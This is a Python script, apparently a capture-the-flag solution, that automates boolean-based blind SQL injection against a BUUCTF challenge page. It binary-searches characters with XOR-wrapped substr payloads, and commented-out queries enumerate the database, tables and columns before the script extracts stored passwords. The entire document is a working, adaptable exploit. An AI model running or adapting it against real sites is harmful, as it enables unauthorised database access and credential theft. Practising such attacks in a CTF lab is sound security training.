import time
import requests
url = "http://e92fadb9-dc06-4156-8184-cb5346128636.node4.buuoj.cn:81/search.php"
flag = ''
for i in range(1,300):
    low = 32
    high = 127
    while low < high:
        mid = (low+high)//2
        # database = "?id=1^(ord(substr((select(database())),%d,1))>%d)^1" % (i, mid)
        # tables = "?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,mid)
        # columns = "?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1"%(i,mid)
        data = "?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, mid)
        # 根据需要查询的内容改变get中的参数
        r = requests.get(url=url+data)
        if 'Click' in r.text:
            low = mid + 1
        else:
            high = mid
        time.sleep(0.1)
    flag += chr(low)
    print("\r", end="")
    print(flag,end='')